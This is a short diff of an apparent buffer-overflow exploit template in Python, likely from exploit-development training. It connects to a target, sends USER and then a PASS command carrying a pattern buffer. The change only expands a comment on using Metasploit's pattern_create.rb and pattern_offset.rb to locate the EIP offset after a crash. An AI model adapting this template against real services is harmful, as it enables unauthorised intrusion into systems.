@@ -7,7 +7,7 @@ s.connect((RHOST, RPORT))
 s.recv(1024) 
 lenFromFuzz = 2700 #get this from fuzzing
 buf = ''
-buf += 1 #paste the result of   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb with fuzzlen here
+buf += 1 #paste the result of   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb with fuzzlen here After the crash look at eip and use that value for pattern_offset.rb -q /value at eip/
 s.send('USER username' +'\r\n')
 s.recv(1024)  
 s.send('PASS ' + buf + '\r\n')
